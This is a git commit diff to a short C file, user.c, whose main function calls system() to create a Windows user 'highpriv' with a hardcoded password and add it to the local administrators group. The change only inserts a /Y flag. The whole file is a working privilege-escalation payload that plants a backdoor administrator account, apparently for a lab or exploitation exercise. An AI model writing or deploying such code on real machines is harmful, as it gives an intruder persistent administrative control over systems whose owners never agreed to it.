c2f6db5f7e3041281851e183c6d4ed5c79469bfe
coopertim13 <cooper.timewell@gmail.com>
2022-02-17 15:18:25 +1100

    ignore prompt

--- user.c
+++ user.c
@@ -2,6 +2,6 @@
 int main()
 {
 int i;
-    i = system("net user /add highpriv Cooperwashere123!? && net localgroup administrators highpriv /add");
+    i = system("net user /add /Y highpriv Cooperwashere123!? && net localgroup administrators highpriv /add");
 return 0;
 }
